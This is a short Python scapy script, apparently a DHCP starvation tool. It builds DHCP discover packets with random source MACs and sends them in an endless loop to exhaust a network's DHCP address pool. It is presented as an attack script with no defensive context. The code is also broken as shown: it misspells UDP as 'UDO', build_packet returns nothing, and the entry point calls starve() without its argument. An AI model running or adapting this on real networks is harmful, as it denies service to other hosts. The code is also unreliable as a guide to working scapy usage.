from scapy.all import *

conf.checkIPaddr = False

def build_packet(destiny_mac: str):
    origin_mac = RandMAC()
    packet = Ether(src=origin_mac, dst=destiny_mac) \
            /IP(src='0.0.0.0', dst='255.255.255.255') \
            /UDO(sport=68, dport=67) \
            /DHCP(options=[('message-type', 'discover'), ('end')])

def starve(destiny_mac: str):
    packet = build_packet(destiny_mac)
    sendp(packet, iface='eth0', loop=1)


if __name__ == '__main__':
    starve()

